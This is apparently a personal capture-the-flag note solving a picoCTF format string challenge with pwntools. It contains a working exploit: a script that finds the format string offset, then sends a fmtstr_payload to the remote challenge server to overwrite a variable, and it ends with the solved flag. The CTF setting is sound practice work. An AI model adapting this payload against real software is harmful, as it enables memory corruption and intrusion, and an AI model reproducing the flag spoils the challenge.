---
created: 2024-08-07T23:48
updated: 2024-08-07T23:57
---

Simple application of format string attack.
## Offset

```python
from pwn import *

elf = context.binary = ELF('./vuln')


def send_payload(payload):
    p = elf.process()
    p.sendline(payload)
    l = p.recvall()
    p.close()
    return l


offset = FmtStr(send_payload).offset
info(f"{offset=}")
```

## Format String Attack

```python
info(f"{elf.symbols['sus']=}")

p = remote('rhea.picoctf.net', 49852)
p.sendline(fmtstr_payload(offset, {elf.symbols['sus']: 0x67616c66}))
info(p.recvall().decode())
p.close()
```

```flag
picoCTF{f0rm47_57r?_f0rm47_m3m_e371fb20}
```
